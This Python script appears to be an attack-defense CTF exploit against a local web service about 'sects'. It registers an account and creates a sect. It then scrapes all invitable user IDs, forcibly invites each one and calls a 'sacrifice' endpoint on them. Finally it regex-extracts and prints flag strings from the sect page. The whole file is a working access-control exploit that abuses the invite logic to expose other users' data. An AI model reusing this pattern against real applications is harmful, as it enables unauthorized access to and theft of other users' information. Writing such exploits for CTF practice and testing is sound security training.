import random
import re
import requests
import lorem

HOST = "http://localhost:8000"


def getCSRF(resp: requests.Response) -> str:
    return re.findall(r'value="([A-z0-9]+)">', resp.text)[0]


def genName() -> str:
    return lorem.get_word(count=1) + str(random.randint(1, 999999))


def setNewUser(s: requests.Session) -> tuple[int, str, str]:
    resp = s.get(HOST+"/register")
    csrf = getCSRF(resp)

    name = genName()
    password = genName()

    resp = s.post(HOST+"/register/", data=dict(
        csrfmiddlewaretoken=csrf,
        username=name,
        password=password,
        can_be_invited=True,
    ))
    csrf = getCSRF(resp)

    resp = s.post(HOST+"/login/", data=dict(
        csrfmiddlewaretoken=csrf,
        username=name,
        password=password,
    ))

    id = re.findall(r'Добро пожаловать, (\d+)\.[0-9A-z]+!</h3>', resp.text)[0]

    return id, name, password


def createSekta(s: requests.Session) -> tuple[int, str]:
    resp = s.get(HOST+"/create_sekta")
    csrf = getCSRF(resp)

    name = genName()
    resp = s.post(HOST+"/create_sekta/", data=dict(
        csrfmiddlewaretoken=csrf,
        sektaname=name,
    ))

    match = re.search(r'<h2>(\d+)\..*<\/h2>',  resp.text)

    if match == None:
        raise Exception(" sect id not found")

    return int(match[1]), name


s = requests.Session()
user_id, user_name, user_password = setNewUser(s)
sectId, sectName = createSekta(s)


resp = s.get(HOST+f"/sekta/{sectId}/invite")

userIds = re.findall(r'name="user"\s*value=(\d+)', resp.text)
for userId in userIds:
    resp = s.get(HOST+f"/sekta/{sectId}/invite_sektant",
                 params=dict(
                     nickname=genName(),
                     sect=sectId,
                     user=userId))
    resp = s.get(HOST+f"/sekta/{sectId}/sacrifice_sektant",
                 params=dict(user=userId))


resp = s.get(HOST+f"/sekta/{sectId}")

flags = re.findall(r"([A-Z0-9]{31}=)", resp.text)
for flag in flags:
    print(flag, flush=True)
